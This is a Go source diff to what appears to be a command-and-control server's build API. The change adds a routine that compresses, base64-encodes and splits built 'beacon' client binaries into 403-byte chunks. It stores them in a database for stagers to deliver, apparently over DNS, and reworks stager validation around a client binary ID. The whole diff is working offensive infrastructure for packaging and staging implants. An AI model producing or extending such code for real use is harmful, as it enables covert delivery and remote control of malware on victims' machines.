@@ -3,7 +3,10 @@
 package main
 
 import (
+	"bytes"
+	"compress/gzip"
 	"crypto/rand"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
@@ -48,7 +51,8 @@ type ClientBuildRequest struct {
 }
 
 type StagerBuildRequest struct {
-	Domain         string `json:"domain"`
+	ClientBinaryID string `json:"client_binary_id"` // ID of pre-built client to use
+	Domain         string `json:"domain"`           // Primary DNS domain (for single-server mode)
 	Platform       string `json:"platform"`
 	PayloadURL     string `json:"payload_url"`
 	JitterMinMs    int    `json:"jitter_min_ms"`
@@ -230,6 +234,11 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 		fmt.Printf("Build saved to: %s\n", savedPath)
 	}
 
+	// Store client binary in database for stager use
+	if err := api.storeClientBinaryForStager(binaryPath, filename, req, savedPath); err != nil {
+		fmt.Printf("Warning: failed to store client binary in database: %v\n", err)
+	}
+
 	// Send binary as download
 	w.Header().Set("Content-Type", "application/octet-stream")
 	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"beacon-%s%s\"", req.Platform, ext))
@@ -256,9 +265,18 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 		return
 	}
 
-	// Validate
-	if req.Domain == "" {
-		api.sendError(w, http.StatusBadRequest, "domain is required")
+	// Validate - in Shadow Mesh mode, client_binary_id is required
+	if req.ClientBinaryID != "" {
+		// Verify client binary exists
+		_, err := api.db.GetClientBinary(req.ClientBinaryID)
+		if err != nil {
+			api.sendError(w, http.StatusBadRequest, "invalid client_binary_id: client binary not found")
+			return
+		}
+		fmt.Printf("[Builder] Building stager for client binary: %s\n", req.ClientBinaryID)
+	} else if req.Domain == "" {
+		// Standalone mode requires domain
+		api.sendError(w, http.StatusBadRequest, "either client_binary_id or domain is required")
 		return
 	}
 
@@ -671,6 +689,72 @@ func (api *APIServer) saveBuild(sourcePath, filename, buildType string) (string,
 	}
 
 	return destPath, nil
+}
+
+// storeClientBinaryForStager compresses, encodes, chunks, and stores client binary for stager deployment
+func (api *APIServer) storeClientBinaryForStager(binaryPath, filename string, req ClientBuildRequest, savedPath string) error {
+	// Read binary file
+	clientData, err := os.ReadFile(binaryPath)
+	if err != nil {
+		return fmt.Errorf("failed to read binary: %w", err)
+	}
+
+	originalSize := len(clientData)
+
+	// Compress with gzip
+	var compressedBuf bytes.Buffer
+	gzWriter := gzip.NewWriter(&compressedBuf)
+	if _, err := gzWriter.Write(clientData); err != nil {
+		return fmt.Errorf("failed to compress: %w", err)
+	}
+	gzWriter.Close()
+
+	compressed := compressedBuf.Bytes()
+	compressedSize := len(compressed)
+
+	// Base64 encode
+	base64Data := base64.StdEncoding.EncodeToString(compressed)
+	base64Size := len(base64Data)
+
+	// Calculate chunks
+	const chunkSize = 403
+	totalChunks := (base64Size + chunkSize - 1) / chunkSize
+
+	// Join DNS domains
+	dnsDomains := strings.Join(req.DNSDomains, ",")
+
+	// Get operator ID from JWT (if available)
+	createdBy := "system"
+	// TODO: Extract from JWT if needed
+
+	// Generate ID
+	binaryID := fmt.Sprintf("client_%d", time.Now().UnixNano())
+
+	// Store in database
+	err = api.db.SaveClientBinary(
+		binaryID,
+		filename,
+		req.Platform,
+		"x64", // Default arch
+		"",    // Version - could be extracted from build or config
+		base64Data,
+		dnsDomains,
+		originalSize,
+		compressedSize,
+		base64Size,
+		chunkSize,
+		totalChunks,
+		createdBy,
+	)
+
+	if err != nil {
+		return fmt.Errorf("failed to save to database: %w", err)
+	}
+
+	fmt.Printf("[Builder] Client binary stored for stager: %s (%d bytes → %d chunks)\n",
+		binaryID, originalSize, totalChunks)
+
+	return nil
 }
 
 // Build represents a saved build
